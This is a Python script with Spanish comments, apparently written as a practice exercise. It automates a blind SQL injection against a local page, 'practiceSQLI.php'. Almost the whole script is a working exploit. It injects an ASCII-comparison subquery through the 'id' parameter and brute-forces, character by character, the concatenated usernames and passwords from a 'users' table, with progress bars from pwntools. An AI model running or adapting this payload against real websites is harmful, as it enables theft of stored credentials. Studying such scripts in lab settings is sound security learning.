#!/usr/bin/python3

# Importaciones necesarias para el script 

import requests # Necesario para las consultas
import signal # Necesario para el ctrl+c
import sys # Necesario para controlar el sistema
import time # Necesario para poder tomar el timepo
import string # Necesario para tomar characteres
from pwn import * # Necesario para importar barras de progreso

# Ctrl+C Function
def def_handler(sig, frame): # Funcion del ctrl_c se le pasa sig y frame
    print("\n\n[+] Saliendo...\n") # Lo que vamos a querer que nos muestre por pantalla
    sys.exit(1) # Saliendo con un codigo de estado no exitoso

# Ctrl+C
signal.signal(signal.SIGINT, def_handler) # Signal es necesario para el ctrl_c, se le pasa el SIGINT y la funcion que emplea

# Variables Globales
main_url = "http://localhost/practiceSQLI.php" # Url principal de la base de datos
characteres = string.printable # Nunca lo usamos, pero tiene characters especiales

# Funcion General

def mySQLI(): # Definicion de nuestra muncion principal
    
    p1 = log.progress("Fuerza Bruta") # Barra de progreso
    p1.status("Iniciamos con la fuerza bruta") # Actualizacion de la barra de progreso

    time.sleep(2) # Esperamos 2 segundos para que el usuario pueda leer

    p2 = log.progress("Datos Extraidos") # Barra de progreso 2

    extracted_info='' # Variable sin contenido para guardar la información extraida

    for position in range(1, 60): # Rango para la cantidad de characteres imprimibles
        for character in range(33, 126): # Rango para la cantidad de characteres selecionables
            sql_query = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character) # Codigo SQL Injection para poder encontrar lo que se no de la gana
            
            p1.status(sql_query) # Actualizacion de la barra de progreso 2

            r = requests.get(sql_query) # Hacemos la petición a la pagina

            if r.status_code == 200: # Condicion de 200
                extracted_info += chr(character) # Guardamos la información en la variable
                p2.status(extracted_info) # Acutalización de estado de la barra 2
                break # Rompemos el siglo cada vez que se encuentre un character valido

if __name__ == "__main__": # Necesario para introducir a la funcion principal

    mySQLI() # Necesario para poder iniciar el script
